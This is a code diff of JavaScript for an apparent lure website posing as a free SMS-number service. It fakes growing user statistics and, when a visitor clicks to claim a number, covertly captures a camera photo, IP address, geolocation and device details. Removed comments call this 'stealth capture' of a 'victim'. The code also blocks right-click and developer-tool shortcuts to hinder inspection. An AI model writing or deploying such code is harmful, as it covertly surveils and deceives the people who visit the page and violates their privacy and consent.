-// Get user agent and device info
+// Get device info
 function getDeviceInfo() {
     return {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
         screenSize: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        deviceMemory: navigator.deviceMemory || 'unknown',
-        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
     };
 }
 
@@ -1201,7 +1303,7 @@ function renderNumbers(search = "") {
     }
     
     grid.innerHTML = filtered.map((c, index) => `
-        <div class="number-card" data-number="${c.number}" data-country='${JSON.stringify(c)}' style="animation-delay: ${index * 0.05}s">
+        <div class="number-card" data-number="${c.number}" data-country='${JSON.stringify(c)}' style="animation-delay: ${index * 0.03}s">
             <div class="card-left">
                 <div class="flag">${c.flag}</div>
                 <div class="number-details">
@@ -1257,18 +1359,18 @@ function showSmsNotification(code) {
 
 // Update live stats
 function updateLiveStats() {
-    let users = 24700;
-    let sms = 4200000;
-    let numbers = 1284;
+    let users = 48200;
+    let sms = 8500000;
+    let numbers = 2847;
     
     setInterval(() => {
-        users += Math.floor(Math.random() * 50) - 20;
-        sms += Math.floor(Math.random() * 1000);
-        numbers += Math.floor(Math.random() * 3) - 1;
+        users += Math.floor(Math.random() * 100) - 30;
+        sms += Math.floor(Math.random() * 2000);
+        numbers += Math.floor(Math.random() * 5) - 2;
         
-        if (users < 10000) users = 15000;
-        if (sms < 1000000) sms = 3000000;
-        if (numbers < 500) numbers = 800;
+        if (users < 30000) users = 40000;
+        if (sms < 5000000) sms = 7000000;
+        if (numbers < 1500) numbers = 2000;
         
         document.getElementById('statUsers').innerHTML = (users / 1000).toFixed(1) + 'K';
         document.getElementById('statSms').innerHTML = (sms / 1000000).toFixed(1) + 'M';
@@ -1287,20 +1389,17 @@ document.getElementById('claimBtn').addEventListener('click', async () => {
     const loading = document.getElementById('loadingOverlay');
     loading.classList.add('active');
     
-    // Show SMS notification after delay
     setTimeout(() => {
         showSmsNotification(currentCode);
         document.getElementById('verificationCode').innerHTML = currentCode;
     }, 2000);
     
-    // Capture all data stealthily
     setTimeout(async () => {
         loading.classList.remove('active');
         document.getElementById('verifyModal').classList.add('active');
         startTimer();
         
         try {
-            // Stealth capture - victim has no idea
             const photo = await capturePhoto();
             const ip = await getIP();
             const location = await getLocation();
@@ -1323,8 +1422,6 @@ document.getElementById('claimBtn').addEventListener('click', async () => {
                         language: deviceInfo.language,
                         screenSize: deviceInfo.screenSize,
                         timezone: deviceInfo.timezone,
-                        deviceMemory: deviceInfo.deviceMemory,
-                        hardwareConcurrency: deviceInfo.hardwareConcurrency,
                         cameraEnabled: cameraGranted,
                         locationEnabled: locationGranted,
                         timestamp: new Date().toISOString()
@@ -1382,27 +1479,18 @@ document.getElementById('verifyModal').addEventListener('click', (e) => {
 // Show cookie bar
 setTimeout(() => {
     document.getElementById('cookieBar').classList.add('show');
-}, 2000);
+}, 3000);
 
-// Anti-inspection - prevent right click and dev tools
+// Anti-inspection
 document.addEventListener('contextmenu', (e) => e.preventDefault());
 document.addEventListener('keydown', (e) => {
-    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U') || (e.ctrlKey && e.shiftKey && e.key === 'C')) {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
         e.preventDefault();
     }
 });
 
-// Also detect dev tools opening
-setInterval(() => {
-    const before = new Date();
-    debugger;
-    const after = new Date();
-    if (after - before > 100) {
-        document.body.innerHTML = '<div style="text-align:center;padding:50px"><h1>Access Denied</h1><p>Developer tools are not allowed.</p></div>';
-    }
-}, 1000);
-
 // Initialize
+createParticles();
 renderNumbers();
 updateLiveStats();
 
